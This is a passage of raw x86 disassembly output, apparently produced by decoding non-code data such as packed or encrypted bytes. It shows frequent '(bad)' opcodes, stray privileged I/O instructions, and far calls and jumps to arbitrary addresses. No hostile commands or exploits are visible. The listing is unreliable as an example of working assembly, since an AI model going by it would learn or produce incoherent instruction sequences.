  415742:	sub    ch,BYTE PTR [edi+0x189fea3f]
  415748:	lods   eax,DWORD PTR ds:[esi]
  415749:	add    BYTE PTR [edi],al
  41574b:	xor    eax,DWORD PTR ds:0xf8f11451
  415751:	xor    DWORD PTR [eiz*4+0x3fd89cb2],ebp
  415758:	call   DWORD PTR [edi-0x21]
  41575b:	adc    ch,cl
  41575d:	mov    ebx,0xb7537431
  415762:	or     DWORD PTR [ebx+0x28],edx
  415765:	scas   al,BYTE PTR es:[edi]
  415766:	lods   al,BYTE PTR ds:[esi]
  415767:	jno    0x4157a2
  415769:	mov    esi,DWORD PTR [esp+edi*2+0x4e323d80]
  415770:	adc    ch,BYTE PTR [edi+eax*8-0x30]
  415774:	leave  
  415775:	inc    ebp
  415776:	cwde   
  415777:	sbb    bl,BYTE PTR [esi+0xc]
  41577a:	cmp    al,0x83
  41577c:	sub    al,0x6
  41577e:	and    eax,0x382ba3c1
  415783:	iret   
  415784:	icebp  
  415785:	xchg   ax,ax
  415787:	loope  0x4157dc
  415789:	inc    ebp
  41578a:	and    al,0x66
  41578c:	dec    edx
  41578d:	shl    ebx,1
  41578f:	shr    bl,1
  415791:	push   esi
  415792:	outs   dx,BYTE PTR ds:[esi]
  415793:	add    bh,BYTE PTR [edi+0x53effd82]
  415799:	and    edi,ebx
  41579b:	(bad)  
  41579c:	dec    ebp
  41579d:	lods   eax,DWORD PTR ds:[esi]
  41579e:	xor    eax,DWORD PTR [ebp+0x39813f62]
  4157a4:	icebp  
  4157a5:	xor    ch,al
  4157a7:	dec    edi
  4157a8:	adc    al,0x5f
  4157aa:	popf   
  4157ab:	mov    ds:0x3400be82,al
  4157b0:	cld    
  4157b1:	or     al,0x22
  4157b4:	inc    edi
	...
  415815:	add    bl,cl
  415817:	(bad)  
  415818:	xchg   ebx,eax
  415819:	in     al,dx
  41581a:	mov    bh,0xed
  41581c:	(bad)  
  41581d:	inc    DWORD PTR [ecx-0x1251961d]
  415823:	mov    ebp,0xe064d67a
  415828:	add    BYTE PTR [eax],al
  41582a:	pop    es
  41582b:	add    DWORD PTR [eax],eax
  41582d:	add    ah,ah
  41582f:	daa    
  415830:	int    0xc0
  415832:	pop    eax
  415833:	scas   al,BYTE PTR es:[edi]
  415834:	pop    ds
  415835:	sar    BYTE PTR [edi+0x5fb8e294],1
  41583b:	out    0x9e,eax
  41583d:	push   edx
  41583e:	ja     0x4157c4
  415840:	dec    eax
  415841:	xchg   esi,eax
  415842:	mov    al,ds:0xa26f9037
  415847:	mov    ds:0x6f6dc8fd,eax
  41584c:	mov    ecx,0x3b34b09e
  415851:	test   al,0xc6
  415853:	jns    0x41587f
  415855:	fmul   st(1),st
  415857:	ror    BYTE PTR [ebx-0x5770044a],cl
  41585d:	mov    ebx,0x7d1f6b80
  415862:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415863:	bound  edi,QWORD PTR ds:0x67034ab9
  415869:	in     eax,0x19
  41586b:	dec    edx
  41586c:	inc    eax
  41586d:	pop    eax
  41586e:	push   ebp
  41586f:	stos   BYTE PTR es:[edi],al
  415870:	and    ebp,DWORD PTR [ebx+ebx*1-0x37187987]
  415877:	mov    al,0x4
  415879:	mov    ds:0x220fe78,eax
  41587e:	jl     0x41580a
  415880:	mov    esi,0x569a858f
  415885:	pop    edi
  415886:	aas    
  415887:	mov    ds:0x6821e747,al
  41588c:	sub    DWORD PTR [eax+0xa],0x6b68d3eb
  415893:	add    ch,bh
  415895:	dec    ecx
  415896:	inc    edi
  415897:	or     dl,BYTE PTR [ebp-0x3e]
  41589a:	cmp    DWORD PTR [edx-0x28e9ace],edi
  4158a0:	hlt    
  4158a1:	popa   
  4158a2:	mov    ah,cl
  4158a4:	cmp    DWORD PTR [esi],eax
  4158a6:	mov    bl,0xbc
  4158a8:	pop    eax
  4158a9:	mov    ds:0x5929489,eax
  4158ae:	sub    al,0x7f
  4158b0:	or     cl,BYTE PTR [ecx-0x2e]
  4158b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158b4:	mov    al,0xb7
  4158b6:	mov    ds:0xcf3535a1,eax
  4158bb:	imul   esi,DWORD PTR [esi-0x181f5684],0x3fa2c5d4
  4158c5:	arpl   bx,bx
  4158c7:	retf   
  4158c8:	leave  
  4158c9:	je     0x4158b2
  4158cb:	xor    edi,DWORD PTR [edi+ebp*1]
  4158ce:	jmp    0xc6c5:0x58ccc866
  4158d5:	adc    dl,dh
  4158d7:	test   eax,0x7138ebb4
  4158dc:	push   ecx
  4158dd:	cmc    
  4158de:	dec    edi
  4158df:	loop   0x415941
  4158e1:	xchg   esp,eax
  4158e2:	xchg   edx,eax
  4158e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158e4:	push   es
  4158e5:	repz jno 0x4158a0
  4158e8:	retf   0x7b2a
  4158eb:	jp     0x4158f8
  4158ed:	cld    
  4158ee:	pop    esi
  4158ef:	popf   
  4158f0:	and    DWORD PTR [esi+0x5c],edi
  4158f3:	in     al,dx
  4158f4:	mov    ch,0x52
  4158f6:	pop    es
  4158f7:	pusha  
  4158f8:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158fa:	ja     0x4158e3
  4158fc:	scas   eax,DWORD PTR es:[edi]
  4158fd:	test   eax,0x9ba39929
  415902:	or     bh,ch
  415904:	add    BYTE PTR [edx+0x77],ch
  415907:	call   0xcb1c:0xac4f05ac
  41590e:	jo     0x4158ca
  415910:	xchg   BYTE PTR [ebp+0x6ac956c5],bl
  415916:	daa    
  415917:	sbb    eax,0x38546e93
  41591c:	jl     0x4158e6
  41591e:	test   al,0x66
  415920:	xchg   esi,eax
  415921:	sbb    eax,ebp
  415923:	int3   
  415924:	scas   al,BYTE PTR es:[edi]
  415925:	push   0xed1608ca
  41592a:	cmp    eax,0x8b51a057
  41592f:	mov    ds:0x44e902ed,eax
  415934:	sub    eax,DWORD PTR [eax]
	...
  415996:	inc    ebp
  415997:	mov    BYTE PTR [edi+esi*2],ch
  41599a:	in     eax,dx
  41599b:	neg    DWORD PTR [edi-0x46]
  41599e:	es jge 0x415944
  4159a1:	int    0xd0
  4159a3:	jmp    0x0:0xe16b4846
  4159aa:	pop    es
  4159ab:	add    DWORD PTR [eax],eax
  4159ad:	add    BYTE PTR [eax],dl
  4159af:	xor    BYTE PTR ds:0xd85c0c68,ah
  4159b5:	mov    WORD PTR [esi-0x19a7c6ac],gs
  4159bb:	jae    0x4159c7
  4159bd:	popf   
  4159be:	ds adc eax,0xa5f43379
  4159c4:	push   ebp
  4159c5:	ficomp WORD PTR [ebp+eiz*8+0xe]
  4159c9:	push   0x5c
  4159cb:	(bad)  
  4159cc:	sub    DWORD PTR [edx+ebp*8+0x14994f8d],edx
  4159d3:	ficomp DWORD PTR [eax+0x103245d9]
  4159d9:	mov    ecx,0x92969c95
  4159de:	xor    esp,DWORD PTR [eax+0x2f]
  4159e1:	add    al,0x61
  4159e3:	in     eax,dx
  4159e4:	xchg   ebx,eax
  4159e5:	iret   
  4159e6:	sti    
  4159e7:	push   ebp
  4159e8:	xor    BYTE PTR [ebx-0x51ed0e2f],bh
  4159ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4159ef:	sbb    dl,BYTE PTR [edi+0x2151225a]
  4159f5:	mov    ch,0xba
  4159f7:	outs   dx,DWORD PTR ds:[esi]
  4159f8:	mov    WORD PTR [edx+0x2b],ss
  4159fb:	mov    esp,0xc9e17d57
  415a00:	sub    eax,0xe4a645b6
  415a05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a06:	cld    
  415a07:	adc    eax,0x71f1b1c4
  415a0c:	push   cs
  415a0d:	(bad)  
  415a0e:	ficomp WORD PTR [esi+ecx*8+0x35b4cce1]
  415a15:	mov    bh,0x8c
  415a17:	sub    eax,ebp
  415a19:	test   DWORD PTR [edx],edi
  415a1b:	mov    bh,0x7a
  415a1d:	cmp    DWORD PTR [ebx],esp
  415a1f:	adc    al,0xbc
  415a21:	sbb    ebx,DWORD PTR [edi+0xcc5355b]
  415a27:	jbe    0x415a3f
  415a29:	push   esp
  415a2a:	outs   dx,DWORD PTR ds:[esi]
  415a2b:	inc    ecx
  415a2c:	out    0x2c,eax
  415a2e:	jne    0x4159f9
  415a30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a31:	imul   eax,DWORD PTR [esi],0x71
  415a34:	sbb    eax,0x56f78b76
  415a39:	test   eax,0x341f2b09
  415a3e:	and    al,0x76
  415a41:	xor    eax,0x5970df58
  415a46:	sub    DWORD PTR [ecx+0x7a4ff4f8],edi
  415a4c:	adc    cl,dh
  415a4e:	inc    eax
  415a4f:	xor    edi,DWORD PTR [ebx]
  415a51:	out    0x1,eax
  415a53:	dec    ebp
  415a54:	mov    esp,0x1408b8b6
  415a59:	cmp    DWORD PTR [ebp-0x6],edx
  415a5c:	sbb    DWORD PTR [edx-0x15],esp
  415a5f:	xor    DWORD PTR [esi],0xb6ff99fd
  415a65:	je     0x415a65
  415a67:	and    ebp,DWORD PTR [ecx]
  415a69:	jle    0x415aa5
  415a6b:	enter  0xa74c,0x69
  415a6f:	shr    ecx,cl
  415a71:	stos   DWORD PTR es:[edi],eax
  415a72:	mov    al,ds:0x2109a51c
  415a77:	dec    esp
  415a78:	ficomp WORD PTR [edx-0x11]
  415a7b:	fisub  WORD PTR [ebx]
  415a7d:	arpl   WORD PTR [eax+0x41],si
  415a80:	xchg   ecx,eax
  415a81:	(bad)  
  415a82:	pop    ebx
  415a83:	fnstsw WORD PTR [ecx-0x80]
  415a86:	test   DWORD PTR [ecx],ebp
  415a88:	xchg   edi,eax
  415a89:	(bad)  
  415a8a:	xchg   esp,eax
  415a8b:	add    DWORD PTR [edi-0x6c90f13a],edx
  415a91:	(bad)  
  415a92:	popf   
  415a93:	into   
  415a94:	adc    bh,BYTE PTR [edx-0x5a714860]
  415a9a:	adc    BYTE PTR ds:0x456ac3f0,al
  415aa0:	lahf   
  415aa1:	shl    edi,0x8
  415aa4:	lock and ecx,DWORD PTR [edi]
  415aa7:	or     BYTE PTR [ecx+edx*4-0x12],cl
  415aab:	pop    ebx
  415aac:	mov    esp,0x52eac91c
  415ab1:	daa    
  415ab2:	jb     0x415a9d
  415ab4:	lock add BYTE PTR [eax],al
	...
  415b13:	add    BYTE PTR [eax],al
  415b15:	add    bh,bl
  415b17:	mov    esi,0xbb659205
  415b1c:	(bad)  
  415b1e:	jge    0x415aff
  415b20:	nop
  415b21:	mov    al,ds:0x329cb617
  415b26:	jb     0x415b0a
  415b28:	add    BYTE PTR [eax],al
  415b2a:	pop    es
  415b2b:	add    DWORD PTR [eax],eax
  415b2d:	add    BYTE PTR [edi+ecx*2],bh
  415b30:	ins    DWORD PTR es:[edi],dx
  415b31:	mov    dh,BYTE PTR [edi+0x42]
  415b34:	pop    ecx
  415b35:	xchg   ebx,eax
  415b36:	cmp    ecx,DWORD PTR [ebp-0x1c]
  415b39:	push   ds
  415b3a:	lods   al,BYTE PTR ds:[esi]
  415b3b:	xchg   ebp,ebp
  415b3d:	arpl   WORD PTR [edx+ebx*1],ax
  415b40:	mov    edi,0xd0eb23e8
  415b45:	xchg   edi,eax
  415b46:	dec    ecx
  415b47:	mov    ds:0x44584134,eax
  415b4c:	in     al,dx
  415b4d:	dec    esp
  415b4e:	nop
  415b4f:	push   ds
  415b50:	inc    edx
  415b51:	popa   
  415b52:	cwde   
  415b53:	adc    DWORD PTR [edx],edi
  415b55:	dec    edx
  415b56:	jb     0x415bbc
  415b58:	xor    al,0x25
  415b5a:	out    0x52,eax
  415b5c:	ficom  DWORD PTR [esi-0x2bf8c352]
  415b62:	jmp    0x415bba
  415b64:	mov    esp,edx
  415b66:	gs and al,0xc4
  415b69:	cmc    
  415b6a:	mov    edi,0x4f148cc8
  415b6f:	fild   WORD PTR [esi-0x34]
  415b72:	out    0x3b,al
  415b74:	mov    ebp,0xb7cba98c
  415b79:	inc    ebx
  415b7a:	sub    ch,BYTE PTR [ebp-0x622e7a44]
  415b80:	pop    ebp
  415b81:	push   ebx
  415b82:	jg     0x415bb3
  415b84:	xor    edi,edi
  415b86:	fiadd  WORD PTR [ecx+0x166401dd]
  415b8c:	gs (bad) 
  415b8e:	aas    
  415b8f:	sbb    al,ah
  415b91:	mov    dh,0x2f
  415b93:	outs   dx,BYTE PTR ds:[esi]
  415b94:	inc    ebp
  415b95:	ins    BYTE PTR es:[edi],dx
  415b96:	push   ss
  415b97:	xchg   edx,eax
  415b98:	dec    ebx
  415b99:	and    bl,bh
  415b9b:	pop    ebx
  415b9c:	jecxz  0x415b4a
  415b9e:	scas   al,BYTE PTR es:[edi]
  415b9f:	je     0x415b56
  415ba1:	mov    cl,0xe9
  415ba3:	inc    esp
  415ba4:	mov    ebp,esi
  415ba6:	shr    DWORD PTR [edi+0x12acfa39],cl
  415bac:	fisub  WORD PTR [ebx+0xe75afc4]
  415bb2:	jo     0x415b75
  415bb4:	jbe    0x415b94
  415bb6:	pop    esi
  415bb7:	xadd   ebp,ebx
  415bba:	lock sbb ebx,DWORD PTR [edx+0xb]
  415bbe:	pop    DWORD PTR [edi-0x25dd7155]
  415bc4:	fadd   DWORD PTR [ecx-0x24854c1d]
  415bca:	aam    0x4
  415bcc:	jle    0x415c21
  415bce:	sub    BYTE PTR [esi-0x718968a4],0x8c
  415bd5:	cmc    
  415bd6:	sub    esp,ebp
  415bd8:	in     al,0x9
  415bda:	xchg   edx,eax
  415bdb:	adc    al,BYTE PTR [edx]
  415bdd:	add    al,0x26
  415bdf:	(bad)  
  415be0:	mov    bh,0x7e
  415be2:	sbb    al,0x26
  415be4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415be5:	cld    
  415be6:	in     al,dx
  415be7:	mov    al,ch
  415be9:	lods   al,BYTE PTR ds:[esi]
  415bea:	inc    esi
  415beb:	aaa    
  415bec:	ret    0x5b6e
  415bef:	sbb    DWORD PTR ds:0xc4b66702,esi
  415bf5:	xor    eax,0x64731bc
  415bfa:	loop   0x415bcb
  415bfc:	cld    
  415bfd:	arpl   ax,bx
  415bff:	dec    ebx
  415c00:	push   edi
  415c01:	mov    ds,WORD PTR [ebx]
  415c03:	mov    ebx,0x6f31d01a
  415c08:	iret   
  415c09:	sub    eax,0x67df7eab
  415c0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c0f:	loop   0x415c57
  415c11:	and    eax,0xfd2e22e9
  415c16:	sbb    DWORD PTR [edx],ebp
  415c18:	out    dx,al
  415c19:	in     eax,dx
  415c1a:	(bad)  
  415c1b:	xor    eax,0xf4bdf43b
  415c20:	dec    esp
  415c21:	cdq    
  415c22:	imul   esi,esi,0x2a561482
  415c28:	xchg   esi,eax
  415c29:	push   esp
  415c2a:	cmp    BYTE PTR [eax-0x5c],0xc3
  415c2e:	mov    ah,0xab
  415c30:	jne    0x415c60
  415c32:	inc    ebx
  415c33:	mov    ds:0x4f,al
	...
  415c94:	add    BYTE PTR [eax],al
  415c96:	cmp    dl,BYTE PTR [eax]
  415c98:	mov    edi,0xbbbfbf3c
  415c9d:	push   ss
  415c9e:	jno    0x415d07
  415ca0:	mov    esi,0xa2dd390f
  415ca5:	sar    DWORD PTR [ecx-0x1d],cl
  415ca8:	add    BYTE PTR [eax],al
  415caa:	pop    es
  415cab:	add    DWORD PTR [eax],eax
  415cad:	add    BYTE PTR [edi-0xe],ah
  415cb0:	mov    dl,BYTE PTR [edx-0x2]
  415cb3:	fwait
  415cb4:	cmp    BYTE PTR [ecx],0x3b
  415cb7:	push   edi
  415cb8:	or     BYTE PTR [esi],0xd1
  415cbb:	rcr    ch,cl
  415cbd:	cmp    DWORD PTR [edx+0x4295c932],ebx
  415cc3:	and    al,0x5c
  415cc5:	xor    BYTE PTR [esi-0x604ea080],ah
  415ccb:	loope  0x415c92
  415ccd:	xor    eax,0xbe5e0393
  415cd2:	fcmovnu st,st(4)
  415cd4:	pop    edx
  415cd5:	or     DWORD PTR [ebx+0x412abc9f],edi
  415cdb:	xor    DWORD PTR [ebx+0x3e],edi
  415cde:	int3   
  415cdf:	or     al,0xd0
  415ce1:	out    dx,eax
  415ce2:	fwait
  415ce3:	sti    
  415ce4:	imul   ecx,DWORD PTR [edx+0x33],0xa1fecba0
  415ceb:	push   ebx
  415cec:	push   es
  415ced:	addr16 nop
  415cef:	ror    DWORD PTR [esi+0x76980a79],cl
  415cf5:	and    sp,WORD PTR [edi-0x33]
  415cf9:	test   al,0x1e
  415cfb:	xchg   DWORD PTR [esi-0x1830f6b0],ecx
  415d01:	out    dx,eax
  415d02:	xor    al,0xf2
  415d04:	push   edx
  415d05:	rol    BYTE PTR [edx+esi*4],1
  415d08:	sbb    bh,BYTE PTR [ebp+0x46d46b52]
  415d0e:	jns    0x415ca8
  415d10:	sahf   
  415d11:	inc    ebp
  415d12:	add    BYTE PTR [ecx],0x34
  415d15:	mov    dh,0x78
  415d17:	popa   
  415d18:	mov    ch,0xc7
  415d1a:	aas    
  415d1b:	(bad)  ds:0x1e5a039a
  415d21:	(bad)  
  415d22:	add    ebx,DWORD PTR [ebx]
  415d24:	mov    WORD PTR [edx+0x1a0d3222],ss
  415d2a:	cld    
  415d2b:	jbe    0x415d7d
  415d2d:	nop
  415d2e:	jb     0x415cf3
  415d30:	fld    QWORD PTR [edi+0x5e]
  415d33:	shl    DWORD PTR [ecx-0x1ee43612],1
  415d39:	into   
  415d3a:	rol    BYTE PTR [edi+0x11],cl
  415d3d:	pop    edx
  415d3e:	sub    BYTE PTR [edx],al
  415d40:	mov    ds:0x92208128,eax
  415d45:	out    dx,al
  415d46:	jo     0x415d98
  415d48:	jo     0x415ce9
  415d4a:	dec    ebp
  415d4b:	ins    BYTE PTR es:[edi],dx
  415d4c:	pop    ebx
  415d4d:	dec    DWORD PTR [edx+ebx*4]
  415d50:	adc    dl,BYTE PTR [esi-0x58]
  415d53:	jns    0x415d4b
  415d55:	jne    0x415d0b
  415d57:	mov    cl,0x7b
  415d59:	fiadd  WORD PTR [ebx+0x45407e74]
  415d5f:	test   al,0xbc
  415d61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d62:	in     eax,dx
  415d63:	mov    dl,0xa3
  415d65:	shr    BYTE PTR [esi+0xd],0x9b
  415d69:	cmp    bh,BYTE PTR [edx]
  415d6b:	xchg   BYTE PTR [ecx-0x1d278c88],dl
  415d71:	aaa    
  415d72:	dec    esi
  415d73:	retf   
  415d74:	imul   edi,DWORD PTR [ecx+edx*1-0x3b9912aa],0x400d7820
  415d7f:	mov    bl,dl
  415d81:	std    
  415d82:	adc    al,0xa8
  415d84:	push   0xffffffc9
  415d86:	sub    edx,edi
  415d88:	hlt    
  415d89:	jo     0x415d33
  415d8b:	pop    eax
  415d8c:	outs   dx,BYTE PTR ds:[esi]
  415d8d:	ds jae 0x415dca
  415d90:	xor    al,0x9
  415d92:	pop    ebp
  415d93:	retf   
  415d94:	jle    0x415da8
  415d96:	and    edx,DWORD PTR [esi+0x65b80046]
  415d9c:	xchg   edi,eax
  415d9d:	les    esp,FWORD PTR [ecx-0x6ab5e043]
  415da3:	aad    0xb3
  415da5:	xor    edx,0x7b
  415da8:	loope  0x415e07
  415daa:	jb     0x415d57
  415dac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dad:	xchg   edi,eax
  415dae:	add    BYTE PTR [edx-0x21],ah
  415db1:	mov    ds:0x5264ef,eax
	...
  415e16:	out    dx,al
  415e17:	repnz cmc 
  415e19:	add    edi,ebp
  415e1b:	pop    es
  415e1c:	(bad)  
  415e1d:	call   DWORD PTR [eax]
  415e1f:	mov    eax,ds:0xbeea5606
  415e24:	outs   dx,BYTE PTR ds:[esi]
  415e25:	jnp    0x415da7
  415e27:	in     al,0x0
  415e29:	add    BYTE PTR [edi],al
  415e2b:	add    DWORD PTR [eax],eax
  415e2d:	add    BYTE PTR [ebp+0x6],dh
  415e30:	sbb    DWORD PTR [eax-0x497bc389],ebp
  415e36:	fwait
  415e37:	sbb    DWORD PTR [esi],eax
  415e39:	lea    ecx,[edi]
  415e3b:	xchg   ebp,eax
  415e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e3d:	sub    ebp,ebp
  415e3f:	dec    BYTE PTR [ecx-0x3e]
  415e42:	push   0xffffffa3
  415e44:	rol    BYTE PTR [edi-0x3d],0x8f
  415e48:	lods   al,BYTE PTR ds:[esi]
  415e49:	daa    
  415e4a:	cli    
  415e4b:	xchg   ebp,eax
  415e4c:	in     al,0x7e
  415e4e:	data16 movs BYTE PTR es:[edi],BYTE PTR cs:[esi]
  415e51:	add    DWORD PTR [edi+0x3303b58d],edi
  415e57:	ud1    ecx,DWORD PTR [edx-0x5a4c9522]
  415e5e:	(bad)  [edx-0x23]
  415e61:	add    al,0xab
  415e63:	aas    
  415e64:	pop    edx
  415e65:	mov    ?,WORD PTR [edi+esi*8-0x194b5113]
  415e6c:	(bad)  
  415e6d:	mov    ecx,0xfc7f9ab1
  415e72:	enter  0x71c3,0x13
  415e76:	xor    eax,0x24186078
  415e7b:	xchg   edx,eax
  415e7c:	out    dx,al
  415e7d:	pop    esp
  415e7e:	push   ds
  415e7f:	in     al,0xe
  415e81:	xchg   esi,eax
  415e82:	dec    esi
  415e83:	test   al,0x54
  415e85:	ret    
  415e86:	add    BYTE PTR [ebp+0xd875cd2],0xf9
  415e8d:	into   
  415e8e:	addr16 sub al,0x54
  415e91:	in     al,dx
  415e92:	cld    
  415e93:	or     BYTE PTR [esi+0x79],ch
  415e96:	retf   
  415e97:	loopne 0x415e6e
  415e99:	ret    
  415e9a:	mov    ecx,DWORD PTR [edi]
  415e9c:	outs   dx,DWORD PTR ds:[esi]
  415e9d:	sahf   
  415e9e:	mov    cl,0x8d
  415ea0:	lea    ecx,[esi-0x546ab14d]
  415ea6:	push   ebp
  415ea7:	cdq    
  415ea8:	xchg   ecx,eax
  415ea9:	cmp    al,0xa6
  415eab:	cld    
  415eac:	sahf   
  415ead:	inc    edx
  415eae:	in     al,dx
  415eaf:	js     0x415e99
  415eb1:	ins    DWORD PTR es:[edi],dx
  415eb2:	mov    DWORD PTR [edi+eax*8-0x75],eax
  415eb6:	sub    DWORD PTR [edx],edi
  415eb8:	adc    eax,ebx
  415eba:	sub    al,al
  415ebc:	jno    0x415f04
  415ebe:	inc    ebp
  415ebf:	cmp    DWORD PTR [eax-0x26],ecx
  415ec2:	mov    al,ds:0x6880d788
  415ec7:	cmp    bh,cl
  415ec9:	ret    
  415eca:	jl     0x415e7a
  415ecc:	(bad)  
  415ecd:	mov    bh,0x11
  415ecf:	and    esi,ecx
  415ed1:	push   ecx
  415ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ed3:	fisttp WORD PTR [esi]
  415ed5:	test   al,0xf6
  415ed7:	pop    ecx
  415ed8:	ret    0x6995
  415edb:	sub    eax,0x5a5b74ea
  415ee0:	jbe    0x415e72
  415ee2:	rep lods eax,DWORD PTR ds:[esi]
  415ee4:	arpl   WORD PTR [ecx-0x68],bx
  415ee7:	scas   eax,DWORD PTR es:[edi]
  415ee8:	loopne 0x415e6c
  415eea:	hlt    
  415eeb:	mov    esi,0x3de565db
  415ef0:	dec    esi
  415ef1:	rol    DWORD PTR [edx+0x4be939ac],1
  415ef7:	sbb    DWORD PTR [ebx],eax
  415ef9:	mov    esi,0x3e35ac2a
  415efe:	sbb    DWORD PTR [edi+0x5baf237a],0xffffffc3
  415f05:	lahf   
  415f06:	ret    
  415f07:	mov    ds:0x5b072a2f,al
  415f0c:	xor    bl,cl
  415f0e:	sbb    DWORD PTR [ebp+edx*2+0x11],edi
  415f12:	fcom   DWORD PTR [ebx]
  415f14:	icebp  
  415f15:	retf   
  415f16:	ins    DWORD PTR es:[edi],dx
  415f17:	push   es
  415f18:	jno    0x415f25
  415f1a:	and    BYTE PTR [esi],0xf7
  415f1d:	aas    
  415f1e:	retf   0xa4c4
  415f21:	hlt    
  415f22:	and    DWORD PTR [ecx+0x3c5e504a],edi
  415f28:	cdq    
  415f29:	call   0xf628:0x956d7272
  415f30:	mov    esi,0x42e1ba54
	...
  415f95:	add    BYTE PTR [edi],dl
  415f97:	mov    BYTE PTR [esi-0x6e],ch
  415f9a:	push   esi
  415f9c:	dec    DWORD PTR [ebp+0x1b0aa13e]
  415fa2:	jae    0x415f33
  415fa4:	push   ebx
  415fa5:	in     al,0x87
  415fa7:	in     eax,0x0
  415fa9:	add    BYTE PTR [edi],al
  415fab:	add    DWORD PTR [eax],eax
  415fad:	add    BYTE PTR [eax],bl
  415faf:	mov    eax,0xb10610d8
  415fb4:	imul   eax,DWORD PTR [eax+0x70fc1fa0],0x2d43ae28
  415fbe:	xor    eax,0x7cb0cb65
  415fc3:	les    ebp,FWORD PTR [edi+0x1cec1ccc]
  415fc9:	pop    eax
  415fca:	jne    0x415f71
  415fcc:	inc    esi
  415fcd:	ror    DWORD PTR [ecx+0x55],0x75
  415fd1:	sbb    ebx,DWORD PTR [eax+0x23]
  415fd4:	mov    bh,0x86
  415fd6:	xor    BYTE PTR [edi+0x59941f4],bh
  415fdc:	pushf  
  415fdd:	cwde   
  415fde:	repnz pop ecx
  415fe0:	or     bl,BYTE PTR [ebx-0x73]
  415fe3:	dec    esp
  415fe4:	dec    ebp
  415fe5:	pop    ecx
  415fe6:	add    eax,0x758c98cb
  415feb:	mov    esp,ss
  415fed:	sbb    eax,0xfffd1cac
  415ff2:	scas   al,BYTE PTR es:[edi]
  415ff3:	dec    esi
  415ff4:	fadd   DWORD PTR [eax+0x5efb3b28]
  415ffa:	xchg   ebx,eax
  415ffb:	dec    ebp
  415ffc:	enter  0x39a1,0xa9
  416000:	mov    ds:0x3e5566e4,eax
  416005:	sub    BYTE PTR [eax],bl
  416007:	sbb    al,0xe8
  416009:	jmp    0x7d18:0x638be99
  416010:	cmp    eax,0xd0acf0e0
  416015:	mov    bl,0x76
  416017:	enter  0xa1cb,0xdc
  41601b:	dec    esi
  41601c:	cmp    DWORD PTR [ebp+0x5e],ecx
  41601f:	push   ebp
  416020:	js     0x415fad
  416022:	inc    edx
  416023:	cmc    
  416024:	or     DWORD PTR [ecx-0x5a],ecx
  416027:	pop    esi
  416028:	pop    ss
  416029:	call   0x7b12:0x122110cb
  416030:	outs   dx,DWORD PTR ds:[esi]
  416031:	and    eax,0x6b897ebb
  416036:	sub    DWORD PTR [edx-0x5c1238eb],esp
  41603c:	xchg   ecx,eax
  41603d:	mov    ds:0x11178602,eax
  416042:	mov    ah,0x8
  416044:	mov    edx,0x42e55374
  416049:	(bad)  
  41604a:	test   al,0x3f
  41604c:	and    edi,DWORD PTR [ecx+0x46]
  41604f:	mov    bl,0x54
  416051:	in     eax,0xc1
  416053:	mov    al,0xe7
  416055:	out    dx,eax
  416056:	std    
  416057:	movlps QWORD PTR [edi-0x26],xmm6
  41605b:	mov    cl,0x56
  41605d:	mov    eax,ds:0xd8683c95
  416062:	mov    ecx,0x88060c53
  416067:	in     eax,dx
  416068:	data16 lds di,DWORD PTR [ebx-0x28e4dea5]
  416070:	int    0x17
  416072:	lds    eax,FWORD PTR [esp+esi*2-0x6e521e4e]
  416079:	test   DWORD PTR [ecx-0x7c],ebp
  41607c:	pusha  
  41607d:	and    al,0xc0
  41607f:	ret    0x5a61
  416082:	inc    edx
  416083:	repnz and DWORD PTR fs:0x7f0393b1,eax
  41608b:	(bad)  
  41608c:	fwait
  41608d:	dec    edx
  41608e:	cld    
  41608f:	jle    0x4160f3
  416091:	in     al,0x69
  416093:	shl    BYTE PTR [esi-0x58],cl
  416096:	push   ebp
  416097:	or     eax,0x8b90512d
  41609c:	dec    ecx
  41609d:	pop    edx
  41609e:	jnp    0x4160b9
  4160a0:	mov    dl,0xd9
  4160a2:	in     eax,0x71
  4160a4:	cmp    al,0xd1
  4160a6:	lahf   
  4160a7:	test   edi,edi
  4160a9:	mov    ?,WORD PTR [edx-0x55]
  4160ac:	aas    
  4160ad:	cs mov bl,0x38
  4160b0:	mov    ds:0xf2daffce,al
	...
  416115:	add    BYTE PTR [eax],ah
  416117:	jmp    0xdf3d3f57
  41611c:	in     eax,0xff
  41611e:	and    bl,BYTE PTR [ebx-0x1059ee79]
  416124:	ror    ah,cl
  416126:	mov    fs,esi
  416128:	add    BYTE PTR [eax],al
  41612a:	pop    es
  41612b:	add    DWORD PTR [eax],eax
  41612d:	add    cl,al
  41612f:	xor    eax,0x2332d348
  416134:	mov    al,BYTE PTR [ebx+0x4a35bd27]
  41613a:	gs cmp al,0xa9
  41613d:	lds    ecx,FWORD PTR ds:0x18a68dfc
  416143:	mov    bh,0xf3
  416145:	and    DWORD PTR [ecx+0x62b185fd],0x7d1b433b
  41614f:	std    
  416150:	lds    eax,FWORD PTR [ecx-0x7a]
  416153:	test   BYTE PTR [esi+0x4510737f],bh
  416159:	loope  0x4161ce
  41615b:	in     al,dx
  41615c:	fistp  DWORD PTR [ebx-0x30]
  41615f:	adc    BYTE PTR [eax+0x7e],0xa6
  416163:	shl    BYTE PTR [ebp-0x3],0xa2
  416167:	mul    BYTE PTR [ebp+0x4d]
  41616a:	jmp    0x416126
  41616c:	xor    al,0xe5
  41616e:	push   edx
  41616f:	or     esp,DWORD PTR [eax-0x2b32ef6e]
  416175:	call   0x77e3:0x5616f685
  41617c:	lea    edx,[ecx+0x3b9114e5]
  416182:	ds out dx,eax
  416184:	sti    
  416185:	jb     0x416172
  416187:	lods   eax,DWORD PTR ds:[esi]
  416188:	pop    eax
  416189:	jle    0x4161a1
  41618b:	inc    ecx
  41618c:	xor    DWORD PTR [eax+0x653fb36a],0x3d
  416193:	in     eax,dx
